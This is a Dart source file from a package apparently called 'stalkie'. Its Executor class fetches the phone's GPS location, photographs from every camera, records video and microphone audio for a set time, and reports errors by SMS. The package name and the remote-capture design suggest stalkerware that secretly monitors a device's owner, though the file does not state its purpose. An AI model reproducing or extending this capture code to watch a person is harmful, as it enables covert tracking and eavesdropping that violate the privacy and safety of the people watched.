import 'dart:io';

import 'package:geolocator/geolocator.dart';
import 'package:camera/camera.dart';
import 'package:record/record.dart';
import 'package:stalkie/sms_client.dart';

class Executor {
  static Future<Position> getLocation({Duration? timeout}) {
    return Geolocator.getCurrentPosition(timeLimit: timeout);
  }

  static Future<List<File>> getPhotos() async {
    var cameras = await availableCameras();
    var files = <File>[];
    for (var i in cameras) {
      CameraController? controller;
      try {
        controller = CameraController(i, ResolutionPreset.max);
        await controller.initialize();
        controller.setFlashMode(FlashMode.auto);
        var photo = await controller.takePicture();
        files.add(File(photo.path));
      } catch (e) {
        SmsClient.sendSMS("photo from camera ${i.name} error:\n$e)");
      } finally {
        await controller?.dispose();
      }
    }
    return files;
  }

  static Future<File> getVideo(int index, int dur) async {
    var cameras = await availableCameras();
    var controller = CameraController(cameras[index], ResolutionPreset.max);
    try {
      await controller.initialize();
      controller.setFlashMode(FlashMode.auto);
      controller.startVideoRecording();
      await Future.delayed(Duration(seconds: dur));
      var video = await controller.stopVideoRecording();
      return File(video.path);
    } finally {
      await controller.dispose();
    }
  }

  static Future<File> getAudio(int dur) async {
    var record = Record();
    await record.start();
    await Future.delayed(Duration(seconds: dur));
    var file = await record.stop();
    await record.dispose();
    return File(file!);
  }
}
